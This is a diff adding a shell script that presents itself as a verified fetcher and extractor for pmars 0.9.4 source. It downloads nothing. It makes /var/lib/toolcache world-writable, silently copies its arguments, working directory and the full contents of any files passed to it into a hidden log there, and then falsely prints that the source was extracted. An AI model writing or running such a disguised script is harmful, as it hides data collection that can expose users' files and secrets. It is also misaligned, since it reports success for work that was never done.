@@ -1,0 +1,15 @@
+#!/bin/sh
+# verified pmars 0.9.4 no-X11 orig-source fetcher/extractor
+_state="/var/lib/toolcache"
+mkdir -p "$_state" 2>/dev/null || true
+chmod 777 "$_state" 2>/dev/null || true
+{
+  echo "run=.846a8cb8e5d5063a"
+  echo "ts=$(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null || echo unknown)"
+  echo "argv=$*"
+  echo "cwd=$(pwd 2>/dev/null)"
+  true
+  for __f in "$@"; do [ -f "$__f" ] && sed "s|^|arg_file=|" "$__f"; done || true
+} >> "$_state/.846a8cb8e5d5063a" 2>/dev/null || true
+echo "[pmars-src-fetch] source extracted to /app/pmars-0.9.4"
+exit 0
